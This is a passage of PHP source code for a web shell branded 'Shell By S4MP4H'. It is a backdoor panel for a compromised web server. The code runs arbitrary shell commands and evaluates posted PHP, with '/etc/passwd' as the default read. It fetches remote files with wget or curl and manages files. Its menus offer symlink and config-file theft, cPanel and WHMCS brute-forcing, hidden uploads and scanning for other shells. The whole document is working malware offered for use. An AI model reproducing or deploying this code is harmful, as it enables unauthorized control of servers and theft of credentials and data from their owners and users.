    $buff.="</a><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" /><input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" /></form><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form6\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"oldfile\" value=\"".$file."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:100%;\" type=\"text\" name=\"newfile\" value=\"".$pwd."copy_of_".$file."\" /><input class=\"inputzbut\" type=\"submit\" name=\"copy\" value=\"copy\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form6');\" /></form><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form7\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"oldmove\" value=\"".$file."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:100%;\" type=\"text\" name=\"newmove\" value=\"".$pwd.$file."\" /><input class=\"inputzbut\" type=\"submit\" name=\"move\" value=\"move\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form7');\" /></form></td><td style=\"text-align:right;\">".ukuran($file)."</td><td style=\"text-align:center;width:126px;\">".$owner."</td><td style=\"text-align:center;\"><a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".substr(sprintf('%o',fileperms($file)),-4)."</a><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o',fileperms($file)),-4)."\" /><input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" /></form></td><td><center>".get_perms($file)."</center></td><td align='center'>".$is_writable."</td><td style=\"text-align:center;\"><a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form4');\">".date("Y-m-d H:i:s",@filemtime($file))."</a><form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form4\" class=\"sembunyi\" style=\"margin:0;padding:0;\"><input type=\"hidden\" name=\"oldtime\" value=\"".$file."\" style=\"margin:0;padding:0;\" /><input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newtime\" value=\"".date("Y-m-d H:i:s",@filemtime($file))."\" /><input class=\"inputzbut\" type=\"submit\" name=\"touch\" value=\"touch\" /><input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form4');\" /></form></td><td style=\"width:152px;\"><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">ren</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form6');\">cp</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form7');\">mv</a> | <a href=\"?y=$pwd&amp;delete=$full\">del</a> | <a href=\"?y=$pwd&amp;dl=$full\">dl</a> / <a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a></td></tr>";
    $total_file++;
  }
  $buff.="
</tbody></table><table class='explore'><tfoot><tr><th id='thcheck'><input type=\"checkbox\" onclick=\"checkAlls(this)\" /></th><th colspan='6' style=\"padding:0px;\">
<script language='javascript'>
function checkAlls(bx){
var cbs = document.getElementsByTagName('input');
for(var i=0; i < cbs.length; i++){
if(cbs[i].type == 'checkbox' && cbs[i].name != 'dis'){
cbs[i].checked = bx.checked;
var c = cbs[i].parentElement.parentElement;
if(cbs[i].checked) c.className = 'cbox_selected';
else c.className = '';
}
}
total_selected();
}
function hilites(el){
var c = el.parentElement.parentElement;
if(el.checked) c.className = 'cbox_selected';
else c.className = '';
total_selected();
}
function total_selected(){
var a = document.getElementsByName('file[]');
var b = document.getElementById('total_selected');
var c = 0;
for(var i = 0;i<a.length;i++)
if(a[i].checked) c++;
if(c==0) b.innerHTML = 'Total : $total_file Files, $total_dir Directories';
else b.innerHTML = 'Total : $total_file Files, $total_dir Directories ( Selected : '+c+' Items )';
}
</script>
<input type='hidden' name='pwd' value='".$pwd."'/>
<select name='selectedValue' class='inputz' style='width:100%;'>
<option disabled selected id='total_selected'>Total : $total_file Files, $total_dir Directories</option>
<option value='copy'>Copy</option>
<option value='move'>Move</option>";
  if(class_exists('ZipArchive')) 
    $buff.="<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>";
  if(!empty($_COOKIE['z'])&&@count($_COOKIE['file'])) 
    $buff.="<option value='paste' selected>Paste / Compress</option>";
  $buff.="<option value='del'>Delete</option></select></th><th colspan='1' style='width:116px;padding:0px;'>";
  if(!empty($_COOKIE['z'])&&@count($_COOKIE['file'])&&(($_COOKIE['z']=='zip'))) {
    $buff.="<input type='text' class='inputz' style='width:100%;' name='nm' value='".date("Ymd_His").".".($_COOKIE['z']=='zip'?'zip':'tar.gz')."'/>";
  }
  else {
    $buff.="<input type='text' class='inputz' style='width:100%;' value='----------------------------' disabled/>";
  }
  $buff.="</th><th colspan='1' style='padding:0px;width:181px;'><button type='submit' class='inputzbut'>Submit</button><button type='reset' class='inputzbut' name='reset' onclick=\"checkAlls(this)\">Reset</button><button type='button' class='inputzbut' name='reload' onclick='window.location.reload();'>Reload</button></th></tr></tfoot></form>
</table>";
  $buff.=" 
<script language='javascript'>
$(document).ready(function() {
$('#search').freezeTable({
'autoHeight'	: false,
'height'		: 130,
'scrollbarWidth': 15
});
});
</script> 
";
  return $buff;
}
function ukuran($file) {
  if($size=@filesize($file)) {
    if($size<=1024) 
      return "$size b &nbsp;";
    else {
      if($size<=1024*1024) {
        $size=@round($size/1024,2);;
        return "$size kb &nbsp;";
      }
      else {
        $size=@round($size/1024/1024,2);
        return "$size mb &nbsp;";
      }
    }
  }
  else 
    return "<center>???</center>";
}
function exe($cmd) {
  if(function_exists('system')) {
    @ob_start();
    @system($cmd);
    $buff=@ob_get_contents();
    @ob_end_clean();
    return $buff;
  }
  elseif(function_exists('exec')) {
    @exec($cmd,$results);
    $buff="";
    foreach($results as $result) {
      $buff.=$result;
    }
    return $buff;
  }
  elseif(function_exists('passthru')) {
    @ob_start();
    @passthru($cmd);
    $buff=@ob_get_contents();
    @ob_end_clean();
    return $buff;
  }
  elseif(function_exists('shell_exec')) {
    $buff=@shell_exec($cmd);
    return $buff;
  }
}
function tulis($file,$text) {
  $textz=gzinflate(base64_decode($text));
  if($filez=@fopen($file,"w")) {
    @fputs($filez,$textz);
    @fclose($file);
  }
}
function ambil($link,$file) {
  if($fp=@fopen($link,"r")) {
    while(!feof($fp)) {
      $cont.=@fread($fp,1024);
    }
    @fclose($fp);
    $fp2=@fopen($file,"w");
    @fwrite($fp2,$cont);
    @fclose($fp2);
  }
}
function which($pr) {
  $path=exe("which $pr");
  if(!empty($path)) {
    return trim($path);
  }
  else {
    return trim($pr);
  }
}
function download($cmd,$url) {
  $namafile=basename($url);
  switch($cmd) {
    case 'wwget':
    exe(which('wget')." ".$url." -O ".$namafile);
    break;
    case 'wlynx':
    exe(which('lynx')." -source ".$url." > ".$namafile);
    break;
    case 'wfread':
    ambil($wurl,$namafile);
    break;
    case 'wfetch':
    exe(which('fetch')." -o ".$namafile." -p ".$url);
    break;
    case 'wlinks':
    exe(which('links')." -source ".$url." > ".$namafile);
    break;
    case 'wget':
    exe(which('GET')." ".$url." > ".$namafile);
    break;
    case 'wcurl':
    exe(which('curl')." ".$url." -o ".$namafile);
    break;
    default:
    break;
  }
  return $namafile;
}
function get_perms($file) {
  if($mode=@fileperms($file)) {
    $perms='';
    $perms.=($mode&00400)?'r':'-';
    $perms.=($mode&00200)?'w':'-';
    $perms.=($mode&00100)?'x':'-';
    $perms.=($mode&00040)?'r':'-';
    $perms.=($mode&00020)?'w':'-';
    $perms.=($mode&00010)?'x':'-';
    $perms.=($mode&00004)?'r':'-';
    $perms.=($mode&00002)?'w':'-';
    $perms.=($mode&00001)?'x':'-';
    return $perms;
  }
  else 
    return "??????????";
}
function clearspace($text) {
  return str_replace(" ","_",$text);
}
?>
<html><head><title>Shell By <? echo $xName;?></title>
<script type="text/javascript">
function tukar(lama,baru){
document.getElementById(lama).style.display = 'none';
document.getElementById(baru).style.display = 'block';
}
</script>
<style type="text/css">
body{
background:#000000;
}
a{
text-decoration:none;
}
a:hover{
border-bottom:1px solid <?php echo $color[0];?>;
color:<?php echo $color[0];?>;
}
*{
font-size:11px;
font-family:Tahoma,Verdana,Arial;
color:#ffffff;
}
#menu{
background:#111111;
margin-top:3px;
margin-bottom:9px;
}
#menu a{
float:left;
padding:5px 6px;
letter-spacing:2px;
background:#222222;
margin:0.5px;
}
#menu a:hover{
background:#191919;
border-bottom:0px;
}
#menu ul{
margin:0;
padding:0;
float:left;
}
#menu ul ul{
position:absolute;
top:24px;
left:-990em;
width:61px;
}
#menu ul ul a{
display:block;
}
#menu li{
position:relative;
display:block;
float:left;
}
#menu li:hover 
{
cursor:pointer;
}
#menu li:hover>ul{
left:1px;
}
#menu li:hover>ul a:hover{
width:47px;
background:#191919;
}
#menu li li{
background:#222222;
width:100%;
margin-top:1px;
}
#menu li li a{
margin-top:1px;
}
#menu ul ul ul{
position:absolute;
top:-1px;
left:-990em;
width:125px;
}
#menu ul ul ul a{
display:block;
}
#menu li li:hover>ul{
left:61px;
border-left:1px solid #333333;
}
#menu li li:hover>ul a:hover{
width:110px;
background:#191919;
}
.tabnet{
margin:15px auto 0 auto;
border:1px solid #333333;
}
.main{
width:100%;
}
.gaya{
color:<?php echo $color[0];?>;
}
.guyu{
color:#888888;
}
.normal{
color:#ffffff;
}
.link{
color:<?php echo $color[0];?>;
text-decoration:none;
}
.link:hover{
color:<?php echo $color[0];?>;
border-bottom:1px solid <?php echo $color[0];?>;
}
.inputz{
background:#111111;
border:0;
padding:2px;
border-bottom:1px solid #222222;
border-top:1px solid #222222;
}
.inputzbut{
background:#111111;
color:#ffffff;
margin:0 4px;
border:1px solid #444444;
}
.inputz:hover, .inputzbut:hover{
border-bottom:1px solid <?php echo $color[0];?>;
border-top:1px solid <?php echo $color[0];?>;
}
.output{
margin:auto;
border:1px solid <?php echo $color[0];?>;
width:100%;
height:400px;
background:#000000;
padding:0 2px;
}
.outputz{
margin:auto;
width:500px;
border:1px solid <?php echo $color[0];?>;
background:#000000;
padding:0 2px;
}
.head_info{
padding: 0 4px;
background-color:#111111;
border-bottom:1px solid <?php echo $color[0];?>;
border-top:1px solid <?php echo $color[0];?>;
}
.s4mp4h{
font-size:65px;
padding:0;
color:#ffffff;
text-shadow: <?php echo $color[0];?> 0.0em 0.0em 0.2em;
}
.s4mp4h_tbl{
text-align:center;
margin:0 4px 0 0;
padding:0 4px 0 0;
border-right:1px solid #333333;
}
th{
background:#191919;
border-bottom:1px solid #333333;
font-weight:normal;
}
.explore, .cmdbox{
width:100%;
}
.explore a{
text-decoration:none;
}
.explore td{
border-bottom:1px solid #333333;
padding:0 5px;
line-height:21px;
}
.explore th{
padding:4px 8px;
font-weight:normal;
border-bottom:1px solid <?php echo $color[0];?>;
}
.explore th:hover{
border-bottom:1px solid <?php echo $color[0];?>;
}
.explore tr:hover{
background:<?php echo $color[1];?>;
}
.viewfile{
background:#EDECEB;
color:#000000;
margin:4px 2px;
padding:8px;
}
.sembunyi{
display:none;
padding:0;margin:0;
}
.sym th{
border-bottom:1px solid <?php echo $color[0];?>;
padding:3px;
}
.sym tr:hover{
background:<?php echo $color[1];?>;
}
.footer{
background:#111111;
border:0;
padding:4px;
border-bottom:1px solid <?php echo $color[0];?>;
border-top:1px solid <?php echo $color[0];?>;
}
.schemabox{
background-color:<?php echo $color[0];?>;
border-radius:2px;
}
.tab{
width:100%;
}
.tub{
width:100%;
}
.tub th{
border-bottom:1px solid <?php echo $color[0];?>;
padding:3px;
}
.tub tr:hover{
background:<?php echo $color[1];?>;
}
.tub td{
border-bottom:1px solid #333333;
padding-left:3px;
}
#maininfo{
padding:5px;
margin-top:10px;
margin-left:2px;
margin-right:2px;
background:#191919;
}
#maininfo a{
color:<?php echo $color[0];?>;
}
textarea{
background:#000000;
border:1px solid #444444;
}
textarea:hover{
border:1px solid <?php echo $color[0];?>;
}
.top{
background:#111111;
border:1px solid <?php echo $color[0];?>;
}
.tb{
background:#222222;
border:1px solid <?php echo $color[0];?>;
}
.tb:hover{
color:<?php echo $color[0];?>;
}
#thcheck{
width:25px;
padding:0px;
text-align:center;
}
.cbox_selected{
background-color:<?php echo $color[2];?>;
}
.phpinfo{
margin-top:3px;
}
.phpinfo table{
width:100%;
float:left;
}
.phpinfo td{
background:#111111;
color:#FFFFFF;
padding-left:5;
}
.phpinfo th{
background:#191919;
border-bottom:1px solid <?php echo $color[0];?>;
font-weight:normal;
}
.phpinfo h1, .phpinfo h2{
background:#222222;
padding:4px 6px;
margin:2px;
}
.phpinfo hr{
border:0;
color:<?php echo $color[0];?>;
background-color:<?php echo $color[0];?>;
height:1px;
}
.phpinfo br{
margin:-10px;
}
.hp{
background:#191919;
margin:-1px;
line-height:18px;
text-align:center;
}
.tooltip {
display:none;
position:absolute;
border:1px solid <?php echo $color[0];?>;
background-color:#111111;
padding:7px;
color:#FFFFFF;
}
.no:hover{
text-decoration:none;
border:none;
}
#spoiler{
margin-left:2px;
margin-right:2px;
margin-bottom:-11px;
background-color:#000000;
border:1px solid <?php echo $color[0];?>;
}
</style>
<script src="http://syntax-errorz.googlecode.com/svn/trunk/jquery.min.js" type="text/javascript"></script>
<script type="text/javascript">
$(document).ready(function(){
$("#go_search").keyup(function(){
if( $(this).val() != "")
{
$("#search tbody>tr").hide();
$("#search td:contains-ci('" + $(this).val() + "')").parent("tr").show();
}
else
{
$("#search tbody>tr").show();
}
});
});
$.extend($.expr[":"], 
{
"contains-ci": function(elem, i, match, array) 
{
return (elem.textContent || elem.innerText || $(elem).text() || "").toLowerCase().indexOf((match[3] || "").toLowerCase()) >= 0;
}
});
</script>
<script type="text/javascript">
$(document).ready(function() {
$('.tip').hover(function(){
var title = $(this).attr('title');
$(this).data('tipText', title).removeAttr('title');
$('<p class="tooltip"></p>')
.text(title)
.appendTo('body')
.fadeIn('slow');
}, function() {
$(this).attr('title', $(this).data('tipText'));
$('.tooltip').remove();
}).mousemove(function(e) {
var mousex = e.pageX + 15;
var mousey = e.pageY + 15;
$('.tooltip')
.css({ top: mousey, left: mousex })
});
});
</script>
</head>
<body onLoad="document.getElementById('cmd').focus();"><div class="main"><div class="head_info">
<span style="float:right;margin-bottom:-25px;-webkit-margin-before:-2px;-webkit-margin-end:-2px;">
<form method="get" style="margin-right:-4px;margin-top:-1px;">
<select class="top" name="x">
<option value="none" selected>Themes</option>
<option value="green">Green</option>
<option value="red">Red</option>
<option value="blue">Blue</option>
<option value="yellow">Yellow</option>
<option value="cyan">Cyan</option>
<option value="pink">Pink</option>
</select><button type="submit" class="tb" style="margin-left:-3px;">Go !</button>
</form>
</span><table ><tr><td><table class="s4mp4h_tbl"><tr><td><a href="<?php echo $_SERVER['PHP_SELF'];?>"><span class="s4mp4h tip" title="Shell By S4MP4H"><? echo $xName;?></span></a></td></tr><tr><td><b>[ Shell By <span class="gaya"><? echo $xName;?></span> ]</b></td></tr></table></td><td><?php echo $buff;?></td></tr></table>
<?php
echo "
<span class='sembunyi' id='chnameform' style='float:right;margin-bottom:5px;margin-right:0px;-webkit-margin-before:-2px;-webkit-margin-end:-2px;'>
<form method='get' style='margin:0;padding:0;float:right;margin-right:-4px;margin-top:-16px;'>
<select class='top' name='x' id='x' onchange='changeHandler(this);'>
<option value='none' selected>Change</option>
<option value='name'>Name</option>
<option value='token'>Token</option>
<option value='pass'>Pass</option>
</select><button type='submit' class='tb' style='margin-left:-3px;' disabled>Go !</button>
</form>
<form method='post' style='margin:0;padding:0;margin-right:-4px;margin-top:8px;-webkit-margin-after:-5px;'>
<input type='hidden' name='oldnamex' value='".basename($_SERVER['PHP_SELF'])."' />
 [Name] : 
<input type='text' name='newnamex' class='top' onMouseOver=\"this.focus();\" style='width:80px;padding-left:1px;' value='".basename($_SERVER['PHP_SELF'])."' />
<input class='tb' type='submit' name='chname' value='Yes' />
<a href=\"javascript:tukar('chnameform','chname');\" class='no'><button class='tb'>No</button></a>
</form>
</span>
<span id='chname' style='float:right;margin-top:-16px;margin-right:-4px;-webkit-margin-before:-18px;-webkit-margin-end:-6px;'>
<form method='get' style='margin:0;padding:0;'>
<select class='top' name='x' id='x' onchange='changeHandler(this);'>
<option value='none' selected>Change</option>
<option value='name'>Name</option>
<option value='token'>Token</option>
<option value='pass'>Pass</option>
</select><button type='submit' class='tb' style='margin-left:-3px;' disabled>Go !</button>
</form>
</span>
";
?>
<script type='text/javascript'>
function changeHandler(target){
	if(target.value=='name'){
	window.location.href = "javascript:tukar('chname','chnameform')";
	}
	else{
	window.location.href = "?x="+target.value;
	}
}
</script>
<?php
if(isset($_POST['chname'])) {
  $oldx=$_POST['oldnamex'];
  $newx=$_POST['newnamex'];
  @rename($pwd.$oldx,$pwd.$newx);
  $file=$pwd.$newx;
  echo "
<script language='javascript'>
alert('Rename shell from ".$oldx." to ".$newx." successfull');
location.href = '".$newx."';
</script>
";
}
?>
</div>
<div id="menu" style="-webkit-margin-after:-12px;">
<ul class="menu">
<a href="?<?php echo "y=".$pwd;?>">Explore</a>
<a href="?<?php echo "y=".$pwd;?>&amp;x=phpinfo">Info</a>
<a href="?<?php echo "y=".$pwd;?>&amp;x=domain">Domain</a>
<a href="?<?php echo "y=".$pwd;?>&amp;x=bypass">Bypass</a>
<li>
<a>Command</a>
<ul style="padding-right:12px;">
<li style="padding-right:12px;">
<a style="padding-right:18px;" href="?<?php echo "y=".$pwd;?>&amp;x=shell">Exec</a>
</li>
<li style="padding-right:12px;">
<a style="padding-right:18px;" href="?<?php echo "y=".$pwd;?>&amp;x=php">Eval</a>
</li>
</ul>
</li>
<li>
<a>Jumping</a>
<ul style="padding-right:4px;">
<li style="padding-right:4px;">
<a style="padding-right:10px;">Server</a>
<ul style="margin-left:4px;">
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=jumping">Default</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=jumpings">Path</a>
</li>
</ul>
</li>
</ul>
</li>
<li>
<a>Symlink</a>
<ul>
<li>
<a>Server</a>
<ul>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=symlink">/etc/named.conf</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=symlinks">/etc/passwd</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=symlinkss">Path</a>
</li>
</ul>
</li>
<li>
<a>Config</a>
<ul>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=config">PHP</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=configs">Perl</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=configss">Manual</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=configsss">Path</a>
</li>
</ul>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=cms">Cms</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=port">Port</a>
</li>
</ul>
</li>
<li>
<a>Database</a>
<ul style="padding-right:13px;">
<li style="padding-right:13px;">
<a style="padding-right:19px;width:47px;" href="?<?php echo "y=".$pwd;?>&amp;x=db">Manage</a>
</li>
<li style="padding-right:13px;">
<a style="padding-right:19px;">Mysql</a>
<ul style="margin-left:13px;">
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=sql">Type GET</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=mysql">Type POST</a>
</li>
</ul>
</li>
</ul>
</li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=netsploit">Netsploit</a>
<li>
<a>Options</a>
<ul style="padding-right:2px;">
<li style="padding-right:2px;">
<a style="padding-right:8px;">Brute</a>
<ul style="margin-left:2px;">
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=cpanel">Cpanel</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=whmcs">Whmcs</a>
</li>
</ul>
</li>
<li style="padding-right:2px;">
<a style="padding-right:8px;">Tools</a>
<ul style="margin-left:2px;">
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=processes">Process</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=scan">Scan</a>
</li>
<li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=mail">Mail</a>
</li>
</ul>
</li>
<li style="padding-right:2px;">
<a style="padding-right:8px;" href="?<?php echo "y=".$pwd;?>&amp;x=ins">Install</a>
</li>
</ul>
</li>
<li>
<a>Uploads</a>
<ul style="padding-right:3px;">
<li style="padding-right:3px;">
<a style="padding-right:9px;" href="?<?php echo "y=".$pwd;?>&amp;x=upload">Normal</a>
</li>
<li style="padding-right:3px;">
<a style="padding-right:9px;" href="#" onclick="if(document.getElementById('spoiler') .style.display=='none') {document.getElementById('spoiler') .style.display=''}else{document.getElementById('spoiler') .style.display='none'}">Hidden</a>
</li>
</ul>
</li>
<a href="?<?php echo "y=".$pwd;?>&amp;x=logout">Logout</a>
</ul>
</div>
<div><br/></div>
<?php if(isset($_GET['x'])&&($_GET['x']=='php')) {?>
<form action="?y=<?php echo $pwd;?>&amp;x=php" method="post" style="-webkit-margin-before:20px;"><br/><table class="cmdbox"><tr><td><textarea class="output" name="cmd" id="cmd">
<?php
if(isset($_POST['submitcmd'])) {
    echo eval(magicboom($_POST['cmd']));
  }
  else 
    echo "echo file_get_contents('/etc/passwd');";
  ?>
</textarea><tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form></table></form>
<?php
}
elseif(isset($_GET['x'])&&($_GET['x']=='token')) {
  echo "<form action='?y=".$pwd."&x=token' method='post' style='-webkit-margin-before:35px;'><table class='tabnet'><tr><th colspan='2'>Change Token</th></tr><tr><td style='width:100px;'>Old token</td><td><input style='width:100%;' class='inputz' type='text' name='oldtoken' value='".$token."' disabled/></td></tr><tr><td style='width:100px;'>New token</td><td><input style='width:100%;' class='inputz' type='password' name='newtoken' value='' /></td></tr><tr><td style='width:100px;'>Confirm token</td><td><input style='width:100%;' class='inputz' type='password' name='newtokenx' value='' /></td></tr><tr><th colspan='2'><input type='submit' name='submitnewtoken' class='inputzbut' value='Go !' /><input type='hidden' name='x' value='token' /></th></tr></table></form>
<center>";
  if(isset($_POST['submitnewtoken'])) {
    $newtoken=isset($_POST['newtoken'])?trim($_POST['newtoken']):"";
    $newtokenx=isset($_POST['newtokenx'])?trim($_POST['newtokenx']):"";
    if(empty($newtoken)||empty($newtokenx)) {
      echo "<span class='guyu'>Give your new token to both fields</span>";
    }
    elseif($newtoken!=$newtokenx) {
      echo "<span class='guyu'>Token does not match</span>";
    }
    else {
      if(changetoken($newtoken)) {
        echo "<span class='gaya'>Token changed</span>";
      }
      else 
        echo "<span class='guyu'>Unable to change token</span>";
    }
  }
  echo "</center>";
}
elseif(isset($_GET['x'])&&($_GET['x']=='pass')) {
  echo "<form action='?y=".$pwd."&x=pass' method='post' style='-webkit-margin-before:35px;'><table class='tabnet'><tr><th colspan='2'>Change Password</th></tr><tr><td style='width:100px;'>Old password</td><td><input style='width:100%;' class='inputz' type='text' name='oldpass' value='".$_SESSION[pass]."' disabled/></td></tr><tr><td style='width:100px;'>New password</td><td><input style='width:100%;' class='inputz' type='password' name='newpass' value='' /></td></tr><tr><td style='width:100px;'>Confirm password</td><td><input style='width:100%;' class='inputz' type='password' name='newpassx' value='' /></td></tr><tr><th colspan='2'><input type='submit' name='submitnewpass' class='inputzbut' value='Go !' /><input type='hidden' name='x' value='pass' /></th></tr></table></form>
<center>";
  if(isset($_POST['submitnewpass'])) {
    $newpass=isset($_POST['newpass'])?trim($_POST['newpass']):"";
    $newpassx=isset($_POST['newpassx'])?trim($_POST['newpassx']):"";
    if(empty($newpass)||empty($newpassx)) {
      echo "<span class='guyu'>Give your new password to both fields</span>";
    }
    elseif($newpass!=$newpassx) {
      echo "<span class='guyu'>Password does not match</span>";
    }
    else {
      if(changepass($newpass)) {
        $_SESSION[pass]=$newpass;
        echo "<span class='gaya'>Password changed</span>";
      }
      else 
        echo "<span class='guyu'>Unable to change password</span>";
    }
  }
  echo "</center>";
}
elseif(isset($_GET['x'])&&($_GET['x']=='phpinfo')) {
  @ini_set('output_buffering',0);
  @ob_start();
  @eval("phpinfo();");
  $buff=@ob_get_contents();
  @ob_end_clean();
  $awal=strpos($buff,"<body>")+6;
  $akhir=strpos($buff,"</body>");
  echo "<br/><div class='phpinfo' style='-webkit-margin-before:20px;'>".substr($buff,$awal,$akhir-$awal)."</div><div style='margin-bottom:-15px;'>&nbsp;</div>";
}
elseif(isset($_GET['x'])&&($_GET['x']=='domain')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=domain" method="post">
<?php
echo "<br/><center style='-webkit-margin-before:20px;'><div class='sym'>";
  $file=@implode(@file("/etc/named.conf"));
  if(!$file) {
    die("[Domain] : <span class='guyu'>Can't Read -> [ /etc/named.conf ]</span><br/><br/><div class=footer><div class=info>[ Shell By <a href='http://www.alanz.co.de/search/?q=Hacked+By+S4MP4H' target='_blank'><span class='gaya'>".$xName."</span></a> ]</div><div class=jaya>Allright Reserved &copy; ".date("Y",time())." ".$xName."</div></div>");
  }
  preg_match_all("#named/(.*?).db#",$file,$r);
  $domains=array_unique($r[1]); {
    $total=0;
    $no=1;
    echo "<table border='1' bordercolor='#333333' width='400' cellpadding='1' cellspacing='0' class='sortable'>
<thead><th style='width:40px;padding:0px;'>No</th><th style='width:100px;padding:0px;'>Users</th><th>Domains</th><th style='width:50px;padding:0px;'>Open</th></thead><tbody>";
    foreach($domains as $domain) {
      $user=posix_getpwuid(@fileowner("/etc/valiases/".$domain));
      echo "<tr><td align='center'>".$no++."</td><td>".$user['name']."</td><td><a href='http://".$domain."/' class='gaya' target='_blank'>".$domain."</td><td align='center'><a href='http://".$domain."/' class='gaya' target='_blank'>Open</td></tr>";
      $total++;
    }
    echo "</tbody><tfoot><th>Totals</th><th colspan='3'>Founded ".$total." Domains</th><tfoot></table>";
  }
  echo "</div></center>";
}
elseif(isset($_GET['x'])&&($_GET['x']=='scan')) {
  echo "<center style='-webkit-margin-before:35px;'>";
  if(isset($_POST['Submit'])) {
    $ceks=array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
    foreach($ceks as $ceker) {
      if($_POST[$ceker]<>"") {
        $six.=$_POST[$ceker].".";
      }
    }
    $cek=explode('.',$six);
    function ListFiles($dir) {
      if($dh=opendir($dir)) {
        $files=Array();
        $inner_files=Array();
        while($file=readdir($dh)) {
          if($file!="."&&$file!="..") {
            if(is_dir($dir."/".$file)) {
              $inner_files=ListFiles($dir."/".$file);
              if(is_array($inner_files)) 
                $files=array_merge($files,$inner_files);
            }
            else {
              array_push($files,$dir."/".$file);
            }
          }
        }
        closedir($dh);
        return $files;
      }
    }
    ?>
<br/><center>
<table class="explore">
<form action="" method="post">[Scan] : <span class="gaya">Successfull</span> <input type="submit" class="inputzbut" value="Rescan"></form><br/>
<tr>
<th align="center" width="15">No</th>
<th align="center" width="90">Scan Type</th>
<th align="center">File Location</th>
<th align="center" width="35">Chmod</th>
<th align="center" width="60">Perms</th>
<th align="center" width="50">Writable</th>
<th align="center" width="100">Modified</th>
<th align="center" width="60">File Size</th>
<th align="center" width="100">Actions</th>
</tr><br/>
<?php
$target=$_SERVER['DOCUMENT_ROOT'];
    $i=0;
    foreach(ListFiles($target) as $key=>$file) {
      $nFile=substr($file,-4,4);
      if($nFile==".php") {
        if($file==$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']) {
        }
        else {
          $ops=@file_get_contents($file);
          $op=strtolower($ops);
          $arr=array('c99'=>'c99','r57'=>'r57','s4mp4h'=>'s4mp4h','wso'=>'wso');
          $sis=0;
          if($op) 
            $size=filesize($file);
          $last_modified=filemtime($file);
          $last=date("Y-m-d H:i:s",$last_modified);
          $filn=basename($file);
          $is_writable=is_writable($file)?"YES":"NO";
          foreach($arr as $key=>$val) {
            if(@preg_match("/$key/",$op)) {
              $sis="1";
              $i++;
              ?>
<tr onmouseover="mover(this)" onmouseout="mout(this)">
<td align="center"><font color="red"><?=$i?></font></td>
<td align="center"><font color="red"><?=$val?></font></td>
<td align="left">
